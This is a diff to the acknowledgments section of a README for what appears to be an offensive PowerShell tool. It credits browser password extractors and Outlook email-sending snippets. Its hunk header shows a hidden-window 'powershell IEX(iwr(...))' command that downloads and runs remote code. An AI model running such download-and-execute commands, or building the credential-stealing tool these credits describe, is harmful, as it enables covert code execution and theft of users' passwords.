@@ -298,9 +298,11 @@ powershell -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=ht
 ## Acknowledgments
 Inspiration, code snippets, etc.
 
-[neonfury/extract.py (gist)](https://gist.github.com/neonfury/a34a2aadc7c084f08cb046728cd25b54#file-extract-py) | password extractor for Chromium based browsers \
-[foxtonforensics.com/blog/post/analysing-chrome-login-data](https://www.foxtonforensics.com/blog/post/analysing-chrome-login-data) \
-[unode/firefox_decrypt/firefox_decrypt.py](https://github.com/unode/firefox_decrypt/blob/2a163faf6c22f62eb0b061fa3c0b317ae2e4a343/firefox_decrypt.py) | password extractor for firefox
-[stackoverflow | change-audio-level-from-powershell](https://stackoverflow.com/a/31751275/20443541)
+- [github | neonfury/extract.py (gist)](https://gist.github.com/neonfury/a34a2aadc7c084f08cb046728cd25b54#file-extract-py) | password extractor for Chromium based browsers \
+- [github | foxtonforensics.com/blog/post/analysing-chrome-login-data](https://www.foxtonforensics.com/blog/post/analysing-chrome-login-data) \
+- [github | unode/firefox_decrypt/firefox_decrypt.py](https://github.com/unode/firefox_decrypt/blob/2a163faf6c22f62eb0b061fa3c0b317ae2e4a343/firefox_decrypt.py) | password extractor for firefox
+- [stackoverflow | change-audio-level-from-powershell](https://stackoverflow.com/a/31751275/20443541)
+- [community.spiceworks.com | sending-an-email-from-outlook-via-powershell](https://community.spiceworks.com/t/sending-an-email-from-outlook-via-powershell/938248)
+- [learn.microsoft | outlook.mailitem](https://learn.microsoft.com/en-us/office/vba/api/outlook.mailitem)
 
 </details>
